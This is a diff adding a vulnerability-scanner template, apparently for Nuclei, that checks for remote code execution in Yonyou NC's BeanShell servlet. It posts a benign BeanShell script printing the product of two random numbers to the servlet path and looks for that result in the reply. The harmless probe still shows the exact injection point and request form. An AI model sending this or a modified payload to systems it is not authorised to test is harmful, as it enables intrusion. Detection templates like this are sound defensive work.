@@ -1,0 +1,26 @@
+id: yonyou-nc-bsh-servlet-bshservlet-rce
+info:
+  name: Yonyou Nc Bsh Servlet Bshservlet Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce,yonyou
+  description: |
+    Exploits a remote code execution vulnerability in the Yonyou Nc Bsh Servlet Bshservlet.
+variables:
+  r1: "{{rand_int(8000, 9999)}}"
+  r2: "{{rand_int(8000, 9999)}}"
+  result: "{{to_number(r1) * to_number(r2)}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/servlet/~ic/bsh.servlet.BshServlet"
+    body: "bsh.script=print({{r1}}*{{r2}});"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{result}}"
+        part: body
